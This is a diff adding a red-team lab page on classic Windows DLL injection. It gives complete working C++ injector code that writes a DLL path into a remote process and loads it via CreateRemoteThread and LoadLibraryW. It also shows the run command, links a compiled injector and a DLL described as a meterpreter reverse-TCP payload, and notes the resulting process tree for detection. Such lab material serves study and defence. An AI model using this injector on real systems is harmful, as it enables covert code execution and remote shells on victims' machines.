@@ -1,2 +1,60 @@
 # DLL Injection
 
+This lab attempts a classic DLL injection into a remote process.
+
+## Execution
+
+{% code-tabs %}
+{% code-tabs-item title="inject-dll.cpp" %}
+```cpp
+int main(int argc, char *argv[]) {
+	HANDLE processHandle;
+	HANDLE remoteThread;
+	PVOID remoteBuffer;
+	wchar_t dllPath[] = TEXT("C:\\experiments\\evilm64.dll");
+	
+	printf("Injecting DLL to PID: %i\n", atoi(argv[1]));
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);	
+	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
+	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
+	HANDLE hThread = CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
+	CloseHandle(processHandle); 
+	
+	return 0;
+}
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+{% code-tabs %}
+{% code-tabs-item title="attacker@victim" %}
+```text
+PS C:\experiments\inject1\x64\Debug> .\inject1.exe 4892
+Injecting DLL to PID: 4892
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+Attacker receiving a shell from the injected process:
+
+![](../../.gitbook/assets/inject-dll-shell.png)
+
+{% file src="../../.gitbook/assets/inject1.exe" caption="DLL injector.exe" %}
+
+{% file src="../../.gitbook/assets/evilm64.dll" caption="c:\\experiments\\evilm64.dll \(windows/x64/meterpreter/reverse\_tcp\)" %}
+
+## Observations
+
+Note how the notepad has spawned the rundll32 which then spawned a cmd.exe because of the meterpreter payload that got executed as part of the injected dll evilm64.dll into the notepad process:
+
+![](../../.gitbook/assets/inject-dll.png)
+
+![](../../.gitbook/assets/inject-dll-procmon.png)
+
+{% embed data="{\"url\":\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms683212\(v=vs.85\).aspx\",\"type\":\"link\",\"title\":\"GetProcAddress function \(Windows\)\",\"icon\":{\"type\":\"icon\",\"url\":\"https://msdn.microsoft.com/Areas/Epx/Themes/Windows/Content/Winlogo\_favicon.ico\",\"aspectRatio\":0}}" %}
+
+
+
+
+
